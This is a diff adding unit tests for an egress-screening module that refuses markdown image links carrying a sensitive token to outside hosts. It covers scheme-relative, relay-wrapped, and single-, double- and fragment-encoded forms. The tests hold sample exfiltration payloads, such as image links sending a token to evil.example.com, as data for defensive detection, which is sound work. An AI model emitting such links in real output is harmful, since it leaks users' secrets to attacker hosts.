@@ -184,6 +184,97 @@ class TestScreening(unittest.TestCase):
             self.assertIn("client-performs-fetch", rec["out_of_scope"])
 
 
+class TestF288F289Closures(unittest.TestCase):
+    """Wave-275 lane A: scheme-relative screening + digest-leg decoding."""
+
+    _TOK = "CLOSURE-UNIT-TOKEN-3e7f2b"
+
+    def _policy(self):
+        return er.EgressPolicy(
+            trusted_relays=[RELAY],
+            allowed_hosts=("cdn.corp.example",),
+            sensitive_digests=frozenset([
+                hashlib.sha256(self._TOK.encode()).hexdigest()]))
+
+    def test_scheme_relative_is_external(self):
+        # urlsplit of "//h/p" has empty scheme but a real netloc.
+        split = er._split_url("//evil.example.com/c?tok=" + self._TOK)
+        self.assertEqual(split[0], "https")
+        self.assertEqual(split[1], "evil.example.com")
+
+    def test_scheme_relative_digest_refused(self):
+        rec = er.screen_egress_refs(
+            "![x](//evil.example.com/c?tok=%s)" % self._TOK, self._policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-ref-data-exfil")
+
+    def test_scheme_relative_relay_inner_refused(self):
+        inner = "//evil.example.com/c?tok=" + self._TOK
+        url = ("https://teams.microsoft.com/urlp/v1/url/content?url="
+               + urllib.parse.quote(inner, safe=""))
+        rec = er.screen_egress_refs("![x](%s)" % url, self._policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-relay-exfil")
+
+    def test_genuinely_relative_stays_allowed(self):
+        for u in ("/static/logo.png", "#frag", "img.png"):
+            rec = er.screen_egress_refs("![x](%s)" % u, self._policy())
+            self.assertEqual(rec["verdict"], "allow", u)
+            self.assertEqual(rec["refs"][0]["screen"]["note"],
+                             "not-external", u)
+
+    def test_allowed_host_scheme_relative(self):
+        rec = er.screen_egress_refs(
+            "![logo](//cdn.corp.example/logo.png)", self._policy())
+        self.assertEqual(rec["verdict"], "allow")
+
+    def test_single_encoded_digest_refused(self):
+        enc = "".join("%%%02X" % b for b in self._TOK.encode())
+        rec = er.screen_egress_refs(
+            "![x](https://evil.example.com/c?tok=%s)" % enc,
+            self._policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-ref-data-exfil")
+
+    def test_double_encoded_digest_refused(self):
+        enc1 = "".join("%%%02X" % b for b in self._TOK.encode())
+        enc2 = "".join("%%%02X" % b for b in enc1.encode())
+        rec = er.screen_egress_refs(
+            "![x](https://evil.example.com/c?tok=%s)" % enc2,
+            self._policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-ref-data-exfil")
+
+    def test_encoded_fragment_digest_refused(self):
+        enc = "".join("%%%02X" % b for b in self._TOK.encode())
+        rec = er.screen_egress_refs(
+            "![x](https://evil.example.com/x#tok=%s)" % enc,
+            self._policy())
+        self.assertEqual(rec["verdict"], "refuse")
+        self.assertEqual(rec["code"], "egress-ref-data-exfil")
+
+    def test_benign_encoded_stays_allowed(self):
+        # Decoding must not invent digest matches: %41%42%43 is "ABC".
+        rec = er.screen_egress_refs(
+            "![x](https://evil.example.com/search?q=%41%42%43)",
+            self._policy())
+        self.assertEqual(rec["verdict"], "allow")
+
+    def test_canon_text_plus_semantics_and_never_raises(self):
+        # F289 H4 pin (code-review finding): query decoding must use
+        # form semantics (+ -> space) while fragment decoding keeps
+        # '+' literal. A future plus=True/False regression must fail.
+        self.assertEqual(er._canon_text("a+b", plus=True), "a b")
+        self.assertEqual(er._canon_text("a+b", plus=False), "a+b")
+        self.assertEqual(er._canon_text("%20", plus=True), " ")
+        self.assertEqual(er._canon_text("%20", plus=False), " ")
+        for bad in ("%", "%zz", "%25", "a+b", "", None):
+            out = er._canon_text(bad, plus=True)
+            self.assertIsInstance(out, str)
+            out = er._canon_text(bad, plus=False)
+            self.assertIsInstance(out, str)
+
+
 class TestNeverRaises(unittest.TestCase):
     def test_hostile_inputs(self):
         for bad in (None, 123, ["x"], {"u": 1}, b"\xff\xfe\x00bad",
